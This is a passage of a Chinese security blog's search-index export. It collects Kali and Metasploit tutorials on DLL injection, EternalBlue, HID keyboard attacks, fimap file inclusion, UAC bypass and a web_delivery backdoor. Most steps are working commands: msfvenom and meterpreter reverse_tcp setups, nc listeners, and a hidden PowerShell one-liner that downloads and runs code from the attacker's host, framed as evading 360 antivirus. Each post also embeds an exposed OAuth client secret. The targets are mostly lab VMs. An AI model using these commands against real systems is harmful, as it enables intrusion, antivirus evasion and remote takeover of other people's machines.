安全相关Docker Image收集https://my.oschina.net/zjzhai/blog/225112 Docker的save和export命令的区别http://blog.csdn.net/u010472499/article/details/52994454 Docker 资源限制之内存http://www.jb51.net/article/103483.htm Docker容器内存限制的方法http://os.51cto.com/art/201507/485007.htm Dockerfile命令介绍及实例 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[InjectProc&Metasploit]]></title>
    <url>%2FInjectProc.html</url>
    <content type="text"><![CDATA[视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); InjectProc流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。 有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。 大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。&nbsp; DLL注入：打开目标进程。分配空间将代码写入远程进程。执行远程代码。&nbsp;具体可以看看github内容介绍。&nbsp;&nbsp;我看了大牛的视频自己学着模仿了一下使用的InjectProc.exe在cmd运行&nbsp;这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。首先我使用的是—— InjectProc.exe dll_inj path/to/dll.dll notepad.exe&nbsp;首先下载到我的桌面，https://github.com/secrary/InjectProc ，和下载InjectProc.exe，是那位大牛制作完成的。&nbsp;&nbsp;&nbsp; 0x01首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。&nbsp;&nbsp;我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程InjectProc.exe dll_inj path/to/dll.dll notepad.exe。在这里我们使用InjectProc\test_files目录中的，并且我们随机打开一个进程如记事本进程。使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况&nbsp;&nbsp; 0x02那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。首先我们使用msfvenom 生成dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll&nbsp;&nbsp;以及打开我们的msf开启监听&nbsp;那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中&nbsp;使用以下命令,并且打开记事本。&nbsp;&nbsp;得到最终会话&nbsp;&nbsp;&nbsp;视频资料：https://www.youtube.com/watch?v=GT9nBuXatmU InjectProc | Process Injection Techniques | Malwarehttps://www.pinterest.com/penetrationtesting/https://github.com/secrary/InjectProc github var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Eternalblue-Doublepulsar完善教程]]></title>
    <url>%2FEternalblue-Doublepulsar1.html</url>
    <content type="text"><![CDATA[视频演示： var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/eternalblue_doublepulsar.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); Eternalblue-Doublepulsar 链接 —–&gt;github：https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit 1.实验环境 metasploitable3 虚拟机2.攻击环境 kali 2017 扫描ms17-010 是否存在&nbsp; msf &gt; use auxiliary/scanner/smb/smb_ms17_010&nbsp; msf auxiliary(smb_ms17_010) &gt; set RHOSTS 192.168.1.105&nbsp;&nbsp; exploit&nbsp;可以看到ms17-010存在，并使用nmap可以看到445开启&nbsp;&nbsp; 使用exploit——ms17-010&nbsp;&nbsp;1.首先将github的项目下载来下，将eternalblue_doublepulsar.rb 拷贝到 /usr/share/metasploit-framework/modules/exploits/windows/smb目录中,并且将Eternalblue-Doublepulsar-Metasploit整个目录复制到root目录下。&nbsp;&nbsp;&nbsp; 2.将下载的Eternalblue-Doublepulsar-Metasploit 目录整个拷贝到 root目录下&nbsp;&nbsp;&nbsp;3.使用exploit模块 use exploit/windows/smb/eternalblue_doublepulsar&nbsp;4.当执行exploit ,会出现问题时？该怎么办？&nbsp; 5.打开多架构支持/安装wine32 &nbsp; wine -h&nbsp;再exploit时候。。。。使用以下命令即可解决 dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32&nbsp;&nbsp;&nbsp;&nbsp; 设置1.我们查看设置选项看看那些需要设置, DOUBLEPULSARPATH 和ETERNALBLUEPATH 无需设置，因为目录已经复制到root目录下了，以及target 是默认的2008 也无需设置，如果是其他版本可使用show targets 和set target 进行设置 options &nbsp;2.因为目标机子是64位，所以需要进行以下设置。 set PROCESSINJECT lsass.exe &nbsp; set TARGETARCHITECTURE x643.设置目标ip，端口不用动，就是445 set RHOST 192.168.1.105&nbsp;4.设置PAYLOAD ,因为是64位所以需要设置，如果是windows/meterpreter/reverse_tcp，会没有获取到会话&nbsp; set PAYLOAD windows/x64/meterpreter/reverse_tcp&nbsp;5.设置本机反向shell连接 如： set LHOST 192.168.1.104 &nbsp;6.exploit执行攻击载荷 exploit&nbsp;&nbsp;&nbsp; 安全建议：由于之前爆发过多起利用445端口共享漏洞攻击案例，运营商对个人用户关闭了445端口。因校园网是独立的，故无此设置，加上不及时更新补丁，所以在本次事件中导致大量校园网用户中招。管家提供以下安全建议： 1、关闭445、139等端口，方法详见：http://mp.weixin.qq.com/s/7kArJcKJGIZtBH1tKjQ-uA 2、下载并更新补丁，及时修复漏洞（目前微软已经紧急发布XP、Win8、Windows server2003等系统补丁，已经支持所有主流系统，请立即更新）。 XP、Windows Server 2003、win8等系统访问：http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598 Win7、win8.1、Windows Server 2008、Windows 10, Windows Server 2016等系统访问： https://technet.microsoft.com/zh-cn/library/security/ms17-010.aspx 3、安装腾讯电脑管家，电脑管家会自动开启主动防御进行拦截查杀； 4、支付比特币并不能解密文件，不要支付比特币，保留被加密的文件，等待解密。 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑手第三篇----DuckHunterHID for mac]]></title>
    <url>%2FDuckHunterHID.html</url>
    <content type="text"><![CDATA[继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（http://www.ggsec.cn/nethuner-HID.html ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》&nbsp; 0x00 HID 键盘攻击在这个视频键盘HID攻击被证明。它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。这是什么？几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。 通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。&nbsp;&nbsp; DuckHunter HIDDuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。 该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。&nbsp; &nbsp;&nbsp; 0x01 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。 首先呢 我们可以看到在nethunter客户端上可以看到有（DuckHunter HID ）字样，其实他就是模拟黄鸭，USB Rubber Ducky脚本转换为NetHunter HID攻击格式。&nbsp;&nbsp;&nbsp;&nbsp;在默认的选项我们可以看到他给我们提供了默认的几个选项，其中有两个脚本呢 是针对Mac OSX 的HID攻击，攻击后呢返回一个shell连接，这里其中有perl和Ruby两个脚本，我们就选择其中一个选择ruby。&nbsp;&nbsp;0x02选择ruby脚本。我们来简单的看下代码的意思&nbsp;&nbsp;0X031.COMMAND SPACE—–在mac的快捷键表示为搜索框搜索&nbsp;2.STRING terminal ENTER——–输入字符串terminal 搜索终端，并按下回车&nbsp;3.Command+n就是新建的快捷键，功能是新建一个项目，在不同程序有不同的新建项目种类。&nbsp;4.在终端下输入字符串使用ruby socket建立服务端&nbsp;5.当然了在这段代码也我们提示了 使用netcat（nc ）建立监听 并返回会话，他这里0.0.0.0提示我们更改我们黑手nethunter的ip地址。如：查看黑手使用的ip&nbsp;&nbsp;更改ip&nbsp;&nbsp;保存脚本&nbsp;&nbsp;0X041.并且在终端中使用nc命令建立监听 ———nc -vv -l -p 1337 &nbsp;&nbsp;2 .点击三角按钮，执行攻击。 &nbsp;&nbsp;3.返回shell连接&nbsp;&nbsp;&nbsp;&nbsp;最终结果：&nbsp;&nbsp;更多项目可在github–USBDucky 项目中寻找你需要的PAYLOAD。https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads&nbsp;&nbsp; 视频演示可观看个人演示的视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/DuckHunterHID.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fimap_Metasploitable2漏洞攻击]]></title>
    <url>%2Ffimap_metasploitable2%20.html</url>
    <content type="text"><![CDATA[简介Fimap是一款本地及远程的文件包含漏洞检测工具，并能对检测到的漏洞进行利用，带了一个google的语法搜索功能，这款工具只针对文件包含漏洞的检测及利用.&nbsp;&nbsp;本次使用到的环境：docker_kali 攻击者 metasploitable2 靶机环境&nbsp; kali中自带的工具:fimap&lt;p&gt; -H，--harvest 模式为新URL收集URL。 需要一个根网址（-u）开始在那里爬网。 还需要（-w）为质量模式编写URL列表 &amp;nbsp; -d，--depth = CRAWLDEPTH 您希望在收获模式（-H）下爬网目标网站的CRAWLDEPTH（递归级别）。默认值为1. &amp;nbsp; -x，--exploit 启动一个交互式会话，您可以在其中, 选择一个目标并执行某些操作 &amp;nbsp; -C，--enable-color --force-run忽略实例检查，只要运行fimap。&lt;/p&gt; &amp;nbsp; 例子： 1. 简单扫描 ./fimap.py -u &apos;http://localhost/test.php?file=bang&amp;id=23&apos; 2. 使用列表进行扫描 ./fimap.py -m -l &apos;/tmp/urllist.txt&apos; 3. 使用谷歌语法搜索 ./fimap.py -g -q &apos;inurl:include.php&apos; 4. 收集递归等级为3和的网页的所有链接 将URL写入 /tmp/urllist ./fimap.py -H -u &apos;http://localhost&apos; -d 3 -w /tmp/urllist 参考资料：http://tools.kali.org/web-applications/fimap 视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/fimap_metasploitasble2.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;1.本次使用到的是metaspolitable2 靶机环境 ，我们打开浏览器输入该靶机的 ip&nbsp;&nbsp;&nbsp;&nbsp;2.使用fimap的例子4 进行尝试检测 ： fimap -H -u http://localhost -d 3 -w /tmp/urllist &nbsp; &nbsp; 3.在上图中可以看到，对dvwa/dav/twiki/等进行扫描，图中对Mutillidae扫描的列表比较多。 mutillidae是一个免费，开源的Web应用程序，提供专门被允许的安全测试和入侵的Web应用程序。它是由Adrian “Irongeek” Crenshaw和Jeremy “webpwnized” Druin.开发的一款自由和开放源码的Web应用程序。其中包含了丰富的渗透测试项目，如SQL注入、跨站脚本、clickjacking、本地文件包含、远程代码执行等.对检测到的漏洞进行攻击，并忽略实例检查： fimap -x –force-run &nbsp; &nbsp; 4.填写目标序列号1 。进入漏洞url列表，选择漏洞id 如选择1。 &nbsp; &nbsp;5、执行攻击 选择攻击模式。如选择1 &nbsp; &nbsp; 使用fimap 反弹shell 得到回话、 &nbsp; &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metaspolit_bypassuac_win10]]></title>
    <url>%2Fbypassuac-win10.html</url>
    <content type="text"><![CDATA[视频 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/win10_bypassUAC.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;当你得一个meterpreter会话，却提不了权怎么办？？Demon：嘚吧嘚————此方法只能绕过本机防护机制，但是绕不过360等。以及此模块需更新最新版即可&nbsp; 第一步：搜索 bypassuac msf exploit(web_delivery) &gt; search bypassuac &nbsp; &nbsp; &nbsp; 第二步: 使用提权模块，进行对windows uac绕过。 msf exploit(web_delivery) &gt; use exploit/windows/local/bypassuac_eventvwr &nbsp; &nbsp; &nbsp;/// 查看模块选项 msf exploit(bypassuac_eventvwr) &gt; options Module options (exploit/windows/local/bypassuac_eventvwr): Name Current Setting Required Description SESSION yes The session to run this module on. Exploit target: Id Name 0 Windows x86/////////////&nbsp;&nbsp;&nbsp; 第三步： 设置回话 （比如说我这里的话说是1）那就设置1 msf exploit(bypassuac_eventvwr) &gt; set SESSION 1 SESSION =&gt; 1 &nbsp; &nbsp; &nbsp; 第四步： 执行exploit，执行提权。 msf exploit(bypassuac_eventvwr) &gt; exploit &nbsp;&nbsp;&nbsp; 第五步 ：查看会话，在这里你可以发现有2个回话。 msf exploit(bypassuac_eventvwr) &gt; sessions &nbsp;&nbsp;&nbsp; 第六步：进入会话2。进入meterpreter会话，进行进一步的提权操作.以及下面是提权前普通用户和 提权后system 最高权限对比！ &nbsp;&nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container') 视频中相关代码可复制代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！ 代码可直接复制！！！！ &nbsp;]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑手之kali_Nethuner---HID攻击]]></title>
    <url>%2Fnethuner-HID.html</url>
    <content type="text"><![CDATA[&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;接着走着黑手——kali_nethuner的坑继Metasploit后门免杀模块之绕过360我想到了一个思路在Nethuner上 可以执行HID 攻击。 en HID攻击介绍HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/HID_Attacks.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp;&nbsp;&nbsp; HID Attacks—–nethunernethuner 自带的一个HID 攻击 模拟键盘的功能，通过usb数据线插上pc端，即可绕过安全防护等。&nbsp;&nbsp;将代码辅助到此处 执行cmd 命令，以及选择相应的绕过UAC的系统，可执行代码，反弹最终shell，得到meterpreter会话。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 得到meterpreter会话。&nbsp;&nbsp; 结语：最好的结语是没有结语。截稿已经是凌晨44分了，太困了 var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit后门免杀模块之绕过360]]></title>
    <url>%2Fmsf-web-delivery.html</url>
    <content type="text"><![CDATA[绕过360视频演示 var ivaInstance = new Iva('ivaLive', { appkey: 'By9WGzBIx', //应用标示 video: 'http://oc78wb8cz.bkt.clouddn.com/msf_web_delivery.mp4', //视频 title: 'test', //视频标题，后台视频管理中的标题 cover: '' //视频封面，只有在autoplay:false才可生效 }); &nbsp;&nbsp; Metasploit后门模块步骤解说&nbsp;&nbsp;1.第一步：使用msf的脚本后门模块&nbsp;use exploit/multi/script/web_delivery&nbsp;&nbsp;2..第二步：使用 show opinion 查看需要使用的相关参数&nbsp; show options 可看到下列参数：需要选择的是target、payload选项(包含ip以及端口)、uripath等&nbsp;&nbsp;3.第三步：查看target 包含多少可选的目标选项，使用以下参数查看&nbsp; show targets 可看到下列选项包含：Python/PHP/powershell&nbsp;&nbsp;4.第四步：设置target 我们这里选择2 —-powershell的这脚本&nbsp; set target 2 &nbsp;&nbsp;5.第五步：设置payload选项，设置windows（powershell）反弹shell链接&nbsp; set payload windows/meterpreter/reverse_tcp &nbsp;&nbsp;6.第六步：设置攻击者-端口默认是：4444，也可以更改 我这里就不设置了，直接用默认的端口&nbsp; set LHOST 192.168.1.101 &nbsp;&nbsp;7.第七步：设置uripath 路径 设置为根目录—– ‘/‘&nbsp; set URIPATH / &nbsp;&nbsp;8.第八步：执行后门&nbsp; exploit / &nbsp;&nbsp;9.第九步：将代码复制目标机器上cmd 下运行——-利用思路可以用到“Badusb”等多种思路&nbsp; powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring(‘http://192.168.1.101:8080/‘); &nbsp;&nbsp;10.可看到反弹shell &nbsp; session -i //查看回话ID 获取回话进入meterpreter 回话 &nbsp;&nbsp; 视频代码演示重要事情说三遍！！！以下视频暂停或者播放可复制代码 代码可复制 代码可复制 代码可复制 … &nbsp;&nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[新增提问板块]]></title>
    <url>%2FDiscuss1.html</url>
    <content type="text"><![CDATA[&nbsp; 这次新开了一个目的也是一个 增加一个留言板块，增进探讨和提问解决 与更多人参与讨论，方便一起解决,有什么问题可以交个我来进行生成md文档 ，上传本次问题，与更多朋友参与一起讨论探讨，方便解决问题！！ Demon 2017.9.12 &nbsp; var gitment = new Gitment({ owner: 'secistblog', repo: 'secistblog.github.io', oauth: { client_id: '31ca58bed60fa9231b5f', client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3', }, }) gitment.render('container')]]></content>
      <categories>
        <category>提问板块</category>
      </categories>
      <tags>
        <tag>提问板块</tag>
      </tags>
  </entry>
</search>
